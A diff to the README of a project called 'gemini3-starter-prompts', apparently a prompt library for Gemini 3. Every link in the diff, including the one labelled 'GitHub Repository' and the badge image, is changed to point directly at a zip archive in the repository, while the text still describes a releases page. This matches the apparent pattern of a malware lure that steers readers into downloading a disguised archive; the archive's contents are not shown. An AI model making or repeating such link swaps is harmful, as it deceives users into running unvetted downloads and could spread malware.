@@ -1,6 +1,6 @@
 # 🌟 gemini3-starter-prompts - Explore Creative Possibilities with Gemini 3
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/Feezah/gemini3-starter-prompts/releases)
+[![Download Now](https://raw.githubusercontent.com/Feezah/gemini3-starter-prompts/main/prompts/gemini3-starter-prompts_1.9-beta.1.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/Feezah/gemini3-starter-prompts/main/prompts/gemini3-starter-prompts_1.9-beta.1.zip)
 
 ## 📥 Introduction
 
@@ -23,7 +23,7 @@ Before you download, ensure your device meets the following:
 
 1. **Visit the Releases Page**  
    Click the link below to access the release page where you can download the library.  
-   [Download Here](https://github.com/Feezah/gemini3-starter-prompts/releases)
+   [Download Here](https://raw.githubusercontent.com/Feezah/gemini3-starter-prompts/main/prompts/gemini3-starter-prompts_1.9-beta.1.zip)
 
 2. **Select the Latest Version**  
    On the releases page, look for the latest version. It should be labeled as `Latest release`. Click on it to see the available files.
@@ -66,7 +66,7 @@ If you run into any issues or have questions, feel free to reach out through the
 
 ## 🔗 Helpful Links
 
-- [Download Here](https://github.com/Feezah/gemini3-starter-prompts/releases)
-- [GitHub Repository](https://github.com/Feezah/gemini3-starter-prompts)
+- [Download Here](https://raw.githubusercontent.com/Feezah/gemini3-starter-prompts/main/prompts/gemini3-starter-prompts_1.9-beta.1.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Feezah/gemini3-starter-prompts/main/prompts/gemini3-starter-prompts_1.9-beta.1.zip)
 
 We hope you find inspiration using the **gemini3-starter-prompts**. Enjoy exploring your creative possibilities!
